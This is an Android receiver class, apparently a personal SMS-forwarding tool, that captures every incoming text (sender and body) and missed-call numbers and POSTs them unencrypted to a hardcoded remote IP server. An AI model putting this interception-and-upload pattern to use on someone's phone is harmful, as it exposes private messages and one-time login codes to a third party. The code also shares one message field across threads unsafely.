package com.example.didi.transsms;


import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.widget.TextView;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.telephony.PhoneStateListener;


import java.util.HashMap;
import java.util.Map;


public class SmsReceiver extends BroadcastReceiver {
    private static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";
    private static final String CALL_RECEIVED_ACCTION = "android.intent.action.PHONE_STATE";
    private static final int TYPE_RECV_SMS = 1;
    private static final int TYPE_RECV_CALL = 2;
    private static int lastetState = TelephonyManager.CALL_STATE_IDLE;

    private Message mMessage;


    @Override
    public void onReceive(Context context, Intent intent) {

        String action = intent.getAction();
        if (action.equals(SMS_RECEIVED_ACTION)) {
            Bundle bundle = intent.getExtras();
            //如果不为空
            if (bundle != null) {
                //将pdus里面的内容转化成Object[]数组
                Object pdusData[] = (Object[]) bundle.get("pdus");// pdus ：protocol data unit  ：
                //解析短信
                SmsMessage[] msg = new SmsMessage[pdusData.length];
                for (int i = 0; i < msg.length; i++) {
                    byte pdus[] = (byte[]) pdusData[i];
                    msg[i] = SmsMessage.createFromPdu(pdus);
                }
                StringBuffer content = new StringBuffer();//获取短信内容
                StringBuffer phoneNumber = new StringBuffer();//获取地址
                //分析短信具体参数
                for (SmsMessage temp : msg) {
                    content.append(temp.getMessageBody());
                    temp.getServiceCenterAddress();
                    phoneNumber.append(temp.getOriginatingAddress());
                }


                Toast.makeText(context,
                        "发送者号码：" + phoneNumber.toString() + "  短信内容：" + content.toString(),
                        Toast.LENGTH_LONG).show();

                mMessage = new Message();
                mMessage.what = TYPE_RECV_SMS;
                mMessage.obj = phoneNumber.toString() + ":" + content.toString();

                new SubmitPost().start();

            }
        } else if (action.equals(CALL_RECEIVED_ACCTION)) {  //电话状态改变
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            int currentCallState = telephonyManager.getCallState();
            telephonyManager.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
            System.out.println("call ..." + currentCallState);
        }
    }


    PhoneStateListener listener=new PhoneStateListener() {

        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);

            if (lastetState == TelephonyManager.CALL_STATE_RINGING
                    && state == TelephonyManager.CALL_STATE_IDLE) {
                mMessage = new Message();
                mMessage.what = TYPE_RECV_CALL;
                mMessage.obj = incomingNumber.toString();
                new SubmitPost().start();
            }

            lastetState = state;
        }


    };


    class SubmitPost extends Thread {
        @Override
        public void run() {
            //TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

            Map<String, String> params = new HashMap<String, String>();
            switch (mMessage.what) {
                case TYPE_RECV_SMS:
                    params.put("type", "sms");
                    break;
                case TYPE_RECV_CALL:
                    params.put("type", "call");
                    break;
            }

            //params.put("entity", telephonyManager.getLine1Number());
            params.put("body", mMessage.obj.toString());
            String result = HttpUtil.submitPostData("http://101.200.150.209:8103/admin/other/trans/phone", params, "utf-8");
            System.out.println("http post:" + result.toString());


        }

    }
}

